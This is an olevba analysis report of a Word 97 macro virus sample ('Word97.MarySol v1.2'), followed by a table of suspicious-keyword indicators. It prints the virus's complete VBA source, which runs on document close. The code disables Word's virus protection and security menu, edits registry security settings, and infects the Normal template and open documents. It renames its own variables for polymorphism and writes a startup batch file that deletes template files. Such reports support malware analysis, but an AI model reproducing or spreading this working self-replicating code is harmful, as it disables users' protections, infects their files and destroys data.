olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mary.b-55a42d2772043d8e9798e1fa67cb17645aa17e16
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mary.b-55a42d2772043d8e9798e1fa67cb17645aa17e16 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Word97.MarySol v1.2
'(c) 1999 cry0tek

Private Sub Document_Close()
'MarySol
On Error Resume Next
Dim varray(1 To 14) As String
Dim Fv6Ew6Na0Ww7Gh0Db7Ya9 As Long: Dim Lj0Jn1 As Long: Dim Vp8Qi8Nq1Mi3Cu2Np4 As Long: Dim Xu2St0 As Long
If Left(Application.Version, 1) > 9 Then
 CommandBars("Macro").Controls("Security...").Delete
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
 Options.VirusProtection = (1 - 1)
End If
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
Options.SaveNormalPrompt = (1 - 1): Options.ConfirmConversions = (1 - 1): Application.EnableCancelKey = (1 - 1)
Application.ScreenUpdating = (1 - 1): Application.ShowVisualBasicEditor = (1 - 1)
If System.OperatingSystem = "Windows" And System.LanguageDesignation = "English (United States)" Then
 Qp6Bq5Cf9 = GetAttr(NormalTemplate.FullName)
 If Qp6Bq5Cf9 = vbReadOnly Then GoTo Rr2Qx6
 If Qp6Bq5Cf9 = vbReadOnly + vbArchive Then GoTo Rr2Qx6
End If
Set Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1 = ActiveDocument.VBProject.VBComponents.Item(1).Codemodule
Set Fa5 = NormalTemplate.VBProject.VBComponents.Item(1).Codemodule
If Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1.Lines(5, 1) <> "'MarySol" Then
 Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1.DeleteLines 1, _
 Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1.CountOfLines
 Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1.InsertLines 1, Fa5.Lines _
 (1, Fa5.CountOfLines)
 Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41)
End If
If Fa5.Lines(5, 1) <> "'MarySol" Then
 Randomize
 varray(1) = "Qp6Bq5Cf9": varray(2) = "Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1": varray(3) = "Fa5": varray(4) = "Fv6Ew6Na0Ww7Gh0Db7Ya9": varray(5) = "Lj0Jn1": varray(6) = "Vp8Qi8Nq1Mi3Cu2Np4": varray(7) = "Xu2St0"
 varray(8) = "Rr2Qx6": varray(9) = "Kf6Re8Vu1Nq4Fv7In8Zi8Ml2": varray(10) = "Gr2Vy9Bs3Gx7Jx1": varray(11) = "Fw7Li5Xg8": varray(12) = "Au5Jy0": varray(13) = "Bu4Ew2Xx5Vy1Qo6Jj0Fb4Ox9Nx4Ys9": varray(14) = "Nj9Qk5Sb6Mg9Mz4Bh9Cg0Xi2Ty8"
 For i = 1 To 14
  For j = 1 To Int((10 * Rnd) + 1)
   PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
  Next j
  With Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1
   Fv6Ew6Na0Ww7Gh0Db7Ya9 = 1: Lj0Jn1 = 1: Vp8Qi8Nq1Mi3Cu2Np4 = .CountOfLines: Xu2St0 = Len(.Lines(.CountOfLines, 1))
   Do While .Find(varray(i), Fv6Ew6Na0Ww7Gh0Db7Ya9, Lj0Jn1, Vp8Qi8Nq1Mi3Cu2Np4, Xu2St0, True)
    strVal = .Lines(Fv6Ew6Na0Ww7Gh0Db7Ya9, 1)
    strVal = Left(strVal, Lj0Jn1 - 1) & PolyVal & Mid(strVal, Xu2St0)
    .ReplaceLine Fv6Ew6Na0Ww7Gh0Db7Ya9, strVal
    Fv6Ew6Na0Ww7Gh0Db7Ya9 = Vp8Qi8Nq1Mi3Cu2Np4 + 1: Lj0Jn1 = 1
    Vp8Qi8Nq1Mi3Cu2Np4 = .CountOfLines: Xu2St0 = Len(.Lines(.CountOfLines, 1))
   Loop
  End With
  PolyVal = ""
 Next i
 Fa5.DeleteLines 1, _
 Fa5.CountOfLines
 Fa5.InsertLines 1, Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1.Lines _
 (1, Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1.CountOfLines)
 Fa5.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41)
End If
If Fa5.CountOfLines <> 0 And Jt9Qj2Le4Vg4Ld2Gy2Tu1Ym4Mk1.CountOfLines = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Day(Now) = Minute(Now) Then
 Select Case Day(Now)
  Case 3 And Int((15 * Rnd) + 1) = 1
   Application.StatusBar = "Word97.MarySol v1.2"
  Case 12 And Int((30 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Word97.MarySol v1.2"
    .Text = "So many questions, but the answers are so few..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 21 And Int((45 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1&
 End Select
End If
Exit Sub
Rr2Qx6:
Kf6Re8Vu1Nq4Fv7In8Zi8Ml2 = NormalTemplate
Nj9Qk5Sb6Mg9Mz4Bh9Cg0Xi2Ty8 = "c:\windows\startm~1\programs\startup\msexec.bat"
Gr2Vy9Bs3Gx7Jx1 = "attrib -h -r "
Fw7Li5Xg8 = "c:\progra~1\micros~1\templa~1\"
Au5Jy0 = "c:\progra~1\micros~2\templa~1\"
Bu4Ew2Xx5Vy1Qo6Jj0Fb4Ox9Nx4Ys9 = "del "
Open Nj9Qk5Sb6Mg9Mz4Bh9Cg0Xi2Ty8 For Append Access Write As #1
Print #1, vbCr + vbLf + "@echo off"
Print #1, Gr2Vy9Bs3Gx7Jx1 + Fw7Li5Xg8 + Kf6Re8Vu1Nq4Fv7In8Zi8Ml2
Print #1, Gr2Vy9Bs3Gx7Jx1 + Au5Jy0 + Kf6Re8Vu1Nq4Fv7In8Zi8Ml2
Print #1, Bu4Ew2Xx5Vy1Qo6Jj0Fb4Ox9Nx4Ys9 + Fw7Li5Xg8 + Kf6Re8Vu1Nq4Fv7In8Zi8Ml2
Print #1, Bu4Ew2Xx5Vy1Qo6Jj0Fb4Ox9Nx4Ys9 + Au5Jy0 + Kf6Re8Vu1Nq4Fv7In8Zi8Ml2
Print #1, "cls"
Print #1, Bu4Ew2Xx5Vy1Qo6Jj0Fb4Ox9Nx4Ys9 + Nj9Qk5Sb6Mg9Mz4Bh9Cg0Xi2Ty8
Close 1
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msexec.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

